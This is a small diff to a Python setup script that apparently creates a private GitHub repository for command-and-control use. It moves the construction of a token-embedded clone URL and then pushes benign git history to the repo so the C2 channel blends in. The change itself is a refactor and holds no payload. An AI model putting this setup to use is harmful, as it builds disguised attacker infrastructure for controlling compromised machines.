@@ -169,6 +169,9 @@ copy somewhere safe if you want to re-run this script later.
 
 
     should_sync_c2_history = True # are we going to push the benign git history to the newly created c2 git repo?
+    
+    config["primary_clone_url"] = "https://%s@github.com/%s/%s.git" % (config["main_github_token"],
+       config["main_github_username"], config["github_c2_repo_name"])
 
     print("[*] Creating private GitHub repo: %s/%s" % (config["main_github_username"], config["github_c2_repo_name"]) )
     try:
@@ -224,9 +227,6 @@ def sync_c2_history(config):
 
     # cd into cloned git repo to do git munging there
     os.chdir(config["benign_repo_path"])
-
-    config["primary_clone_url"] = "https://%s@github.com/%s/%s.git" % (config["main_github_token"],
-      config["main_github_username"], config["github_c2_repo_name"])
 
     # Push history and tags
     subprocess.check_output("git push --all --repo " + config["primary_clone_url"], shell=True)
